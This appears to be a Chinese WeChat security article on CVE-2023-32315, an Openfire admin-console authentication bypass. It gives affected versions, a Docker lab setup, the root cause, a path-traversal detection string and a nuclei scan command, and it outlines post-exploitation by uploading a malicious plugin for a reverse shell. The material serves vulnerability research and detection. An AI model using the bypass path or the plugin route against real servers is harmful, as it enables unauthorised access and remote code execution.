#  Openfire 控制台权限绕过漏洞 附检测POC+后利用

原创 unknown  [ 极致攻防实验室 ](javascript:void\(0\);)

**极致攻防实验室** ![]()

微信号 jz_sec

功能介绍 极致攻防实验室专注于最前沿，最基础，最实际的红蓝对抗黑客技术。

____

___发表于_

收录于合集

#poc 8 个

#漏洞 8 个

#nuclei 8 个

**免责声明：  
**

本文章或工具仅供安全研究使用，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，极致攻防实验室及文章作者不为此承担任何责任。

 **简介：**

Openfire是一个开源的、实时通讯服务器，它基于XMPP（可扩展通讯和预测协议）协议，采用Java编程语言开发。Openfire通常用来构建企业级的实时通讯应用，支持文本、语音、视频等多种形式的通讯。
**利用条件：** 3.10.0 <= Openfire < 4.6.8 **漏洞环境部署：**

  *   * 

    
    
     docker pull sameersbn/openfire:3.10.3docker run --name openfire -publish 9090:9090 sameersbn/openfire:3.10.3

 **漏洞原理：**
Openfire在进行路径鉴权时没有很好的处理通配符，结合其内置中间件Jetty对unicode解码特性，配合unicode的编码后的..与%2e，使得攻击者可以绕过身份验证访问后台功能页面,且其后台存在插件安装功能，配合安装恶意插件可远程代码执行。
**漏洞检测：**  
poc: /setup/setup-/../../log.jsp,nuclei检测：

  * 

    
    
    ./nuclei -u http://www.xxx.com/ -t ./ultimaste-nuclei-templates/openfire/CVE-2023-32315.yaml

‍

![](https://gitee.com/fuli009/images/raw/master/public/20230617194346.png)nuclei-
templates:https://github.com/UltimateSec/ultimaste-nuclei-
templates/blob/main/openfire/CVE-2023-32315.yaml **后利用思路：** 利用plugin-
admin.jsp路径上传恶意插件反弹shell即可，这里提供一个思路，直接魔改一下msf
cve-2008-6508的exp直接使用：![](https://gitee.com/fuli009/images/raw/master/public/20230617194347.png)![](https://gitee.com/fuli009/images/raw/master/public/20230617194348.png)  
 **修复方式：** 收敛系统访问网络 **参考：** https://learningsomecti.medium.com/path-traversal-
to-rce-openfire-
cve-2023-32315-6a8bf0285fcchttps://github.com/porthunter/gosploit/blob/3b1370488af9de826f0be4d7df92029c30434fd6/modules/exploits/multi/http/openfire_auth_bypass.rb#L183

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

